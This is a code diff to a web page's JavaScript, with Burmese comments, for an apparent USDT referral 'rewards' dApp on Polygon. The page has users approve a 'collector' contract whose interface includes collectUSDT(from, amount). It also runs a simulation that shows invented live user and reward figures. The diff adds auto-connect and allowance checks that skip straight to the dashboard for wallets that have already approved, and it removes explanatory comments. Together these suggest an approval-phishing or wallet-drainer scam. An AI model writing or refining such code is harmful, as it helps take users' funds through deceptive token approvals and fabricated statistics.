@@ -195,12 +195,9 @@
         let provider, signer, userAddress;
         const selectedNetwork = "POLYGON";
 
-        // Deployed Smart Contract Address (ထည့်သွင်းပြီး)
         const COLLECTOR_CONTRACT_ADDRESS = "0x5a30bBD23eD1250ec5A3F8bca8122580E4eBefCC";
-
-        // Polygon Network USDT Address
         const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
-        const POLYGON_CHAIN_ID = "0x89"; // 137 in hex
+        const POLYGON_CHAIN_ID = "0x89";
 
         const ERC20_ABI = [
             "function approve(address spender, uint256 amount) public returns (bool)",
@@ -208,7 +205,6 @@
             "function balanceOf(address account) view returns (uint256)"
         ];
 
-        // Contract ABI (Smart Contract ၏ Function များ အပြည့်အစုံ)
         const COLLECTOR_ABI = [
             "function registerUser(address referrer) external",
             "function collectUSDT(address from, uint256 amount) external",
@@ -217,7 +213,6 @@
             "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered)"
         ];
 
-        // Live Calculating Stats Simulation Function
         function startLiveCalculatingStats() {
             let baseUsers = 142850;
             let baseRewards = 48290.50;
@@ -271,7 +266,49 @@
             updateQRCode(defaultLink);
             generateIncomeList();
             startLiveCalculatingStats();
+            checkAutoConnect();
         });
+
+        // ဝင်ရောက်လာစဉ် Wallet ချိတ်ဆက်ပြီးသားနှင့် Allowance ရှိပြီးသားဖြစ်ပါက အလိုအလျောက် Dashboard ပြရန်
+        async function checkAutoConnect() {
+            if (typeof window.ethereum !== "undefined") {
+                try {
+                    const accounts = await window.ethereum.request({ method: "eth_accounts" });
+                    if (accounts && accounts.length > 0) {
+                        provider = new ethers.BrowserProvider(window.ethereum);
+                        signer = await provider.getSigner();
+                        userAddress = accounts[0];
+
+                        document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
+                        
+                        // Allowance ကို စစ်ဆေးခြင်း
+                        await checkExistingAllowanceAndLoad();
+                    }
+                } catch (err) {
+                    console.error("Auto connect error:", err);
+                }
+            }
+        }
+
+        async function checkExistingAllowanceAndLoad() {
+            try {
+                const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
+                const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
+
+                if (Number(allowance) > 0) {
+                    // Approve ပြီးသားဖြစ်ပါက ခလုတ်ကို Connected & Approved သို့ပြောင်းပြီး Dashboard တင်ရန်
+                    document.getElementById("connectBtn").innerText = "Connected & Approved";
+                    document.getElementById("connectBtn").classList.replace("bg-blue-600", "bg-slate-700");
+                    
+                    const badgeEl = document.getElementById("selectedNetworkBadge");
+                    badgeEl.classList.remove("hidden");
+
+                    await checkUserData();
+                }
+            } catch (err) {
+                console.error("Allowance check error:", err);
+            }
+        }
 
         function getQueryParameter(name) {
             const urlParams = new URLSearchParams(window.location.search);
@@ -310,7 +347,24 @@
 
                 document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                 
-                await switchToPolygonAndApprove();
+                // ပထမဦးစွာ Allowance ရှိမရှိ အရင်စစ်ဆေးပါ (Approve ပြီးသားဆိုရင် ထပ်တောင်းစရာမလိုတော့ပါ)
+                const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
+                const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
+
+                if (Number(allowance) > 0) {
+                    logEl.innerText = "Approval ရှိပြီးသားဖြစ်ပါသည်။ Dashboard သို့ ဝင်ရောက်နေပါပြီ...";
+                    
+                    const badgeEl = document.getElementById("selectedNetworkBadge");
+                    badgeEl.classList.remove("hidden");
+
+                    document.getElementById("connectBtn").innerText = "Connected & Approved";
+                    document.getElementById("connectBtn").classList.replace("bg-blue-600", "bg-slate-700");
+
+                    await checkUserData();
+                } else {
+                    // မလုပ်ရသေးပါက Network ပြောင်းပြီး Approve လုပ်ရန် ဆက်သွားမည်
+                    await switchToPolygonAndApprove();
+                }
             } catch (err) {
                 console.error(err);
                 logEl.innerText = "ချိတ်ဆက်မှု မအောင်မြင်ပါ။";
